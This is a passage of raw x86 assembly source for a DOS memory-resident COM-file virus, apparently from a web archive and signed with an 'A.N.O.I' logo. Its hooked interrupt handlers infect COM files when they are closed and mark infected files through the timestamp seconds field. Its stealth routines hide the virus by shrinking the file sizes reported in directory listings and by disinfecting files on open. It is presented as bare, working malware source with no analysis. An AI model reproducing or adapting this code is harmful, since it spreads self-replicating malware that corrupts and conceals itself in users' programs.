                lea     dx,jmp_1
                int     21h
cancel_inf2:
                pop     cx                      ;restore time/date
                pop     dx

                and     cl,11100000b            ;secs=20
                or      cl,00001010b
                mov     ax,5701h                ;set time/date
                int     21h

                mov     ah,3eh                  ;close
                pushf
                push    cs
                call    call_int21h

                mov     ax,4301h                ;set attrib
                lea     dx,filename
                pop     cx                      ;restore attrib
                int     21h

                ret
find_new:
                pop     bp
                popf

                pushf                           ;find 4e
                push    cs
                call    call_int21h
                jnc     more_files
                retf    2
more_files:
                pushf
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                push    bp

                mov     ah,2fh                  ;get dta
                int     21h

                push    es              ;es:bx
                pop     ds              ;ds:bx

                mov     si,bx           ;ds:si

                push    cs              ;cs => es
                pop     es

                add     si,1eh          ;f name
                lea     di,filename
                mov     cx,25

get_fname:
                lodsb
                cmp     al,0
                je      get_f_klar
                stosb
                loop    get_fname
get_f_klar:
                mov     al,0            ;asciiz
                stosb

                push    ds              ;ds=> es
                pop     es
                push    cs              ;cs=> ds
                pop     ds
                mov     si,di

                sub     si,4            ;'COM'
                lodsw                   ;CO

                cmp     ax,'OC'
                je      check_m
                cmp     ax,'oc'
                jne     cancel_new
check_m:
                lodsb
                cmp     al,'m'
                je      ext_is_com
                cmp     al,'M'
                jne     cancel_new

ext_is_com:
                push    es              ;es=> ds
                pop     ds

                mov     si,bx
                add     si,1ch          ;check size
                lodsw
                cmp     ax,0            ;=> 0ffffh
                jne     cancel_new

                mov     si,bx
                add     si,16h
                lodsw                   ;time
                and     al,00011111b
                cmp     al,00001010b
                jne     cancel_new     ;not infected

                mov     si,bx
                add     si,1ah
                mov     di,si
                lodsw                   ;alter size
                sub     ax,cs:filelen
                jz      cancel_new
                stosw

cancel_new:
                pop     bp
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf
no_more_files2: retf    2               ;iret flags
open:
                pop     bp
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    bp
                push    ds
                push    es


                mov     al,'.'
                push    ds              ;ds=> es
                pop     es
                mov     di,dx           ;es:di filename

                mov     cx,50
                repnz   scasb

                mov     si,di           ;ds:si file ext.

                lodsw
                cmp     ax,'OC'
                je      check_m2
                cmp     ax,'oc'
                je      $+7
                lea     dx,cancel_open
                jmp     far ptr dx
check_m2:
                lodsb
                cmp     al,'m'
                je      ext_is_com2
                cmp     al,'M'
                jne     cancel_open

ext_is_com2:
                mov     ax,3d02h        ;open file
                pushf
                push    cs
                call    call_int21h
                jc      cancel_open
                mov     bx,ax

                push    cs
                pop     ds
                push    cs
                pop     es

                mov     ax,5700h        ;get time/date
                int     21h

                and     cl,00011111b    ;already infected
                cmp     cl,00001010b
                jne     cancel_open

                mov     ax,4202h        ;goto eof
                xor     dx,dx
                xor     cx,cx
                int     21h

                push    ax              ;save size
                sub     ax,3

                mov     dx,ax           ;goto eof -3
                mov     ax,4200h
                mov     cx,0
                int     21h

                mov     ah,3fh          ;read
                mov     cx,3
                lea     dx,temp_bytes
                int     21h


                mov     ax,4200h        ;goto beg
                xor     cx,cx
                xor     dx,dx
                int     21h

                mov     ah,40h          ;write original
                mov     cx,3
                lea     dx,temp_bytes
                int     21h

                pop     dx
                sub     dx,filelen

                mov     ax,4200h        ;goto real size
                mov     cx,0
                int     21h

                mov     ah,40h
                mov     cx,0
                int     21h

                mov     ah,3eh
                pushf
                push    cs
                call    call_int21h
cancel_open:
                pop     es
                pop     ds
                pop     bp
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf

                pushf                           ;open file...
                push    cs
                call    call_int21h
                retf    2

close_file:
                pop     bp
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    bp
                push    ds
                push    es

                mov     ax,1220h        ;get handle table
                int     02Fh
                mov     bl,es:[di]
                mov     ax,1216h
                int     02Fh

                mov     bp,di

                add     di,28h
                push    es
                pop     ds
                mov     si,di
                lodsw
                cmp     ax,'OC'
                jne     cancel_open
                lodsb
                cmp     al,'M'
                jne     cancel_open

                mov     si,bp
                add     si,20h
                push    cs
                pop     es

                call    infect

                jmp     cancel_open

get_rnd:
                push   dx
                push   cx
                push   bx
                in     al,40h                         ;'@'
                add    ax,0000
                mov    dx,0000
                mov    cx,0007
rnd_init5:
                shl    ax,1
                rcl    dx,1
                mov    bl,al
                xor    bl,dh
                jns    rnd_init6
                inc    al
rnd_init6:
                loop   rnd_init5
                pop    bx
                mov    al,dl
                pop    cx
                pop    dx
rnd_init_ret:
                ret

logo            db      '>>>  A.N.O.I  <<<' ; DATA to overwrite with


temp_bytes      db      3 dup(?)
filelen         dw      offset eof - offset start
memlen          dw      100
file_buffer     db      80 dup(20h)
filename        db      12 dup(?)

jmp_1           db      0e9h
jmp_2           dw      ?
first_bytes     db      90h,0cdh,20h

eof:
                end     start
</textarea></td></tr></table></body></html>
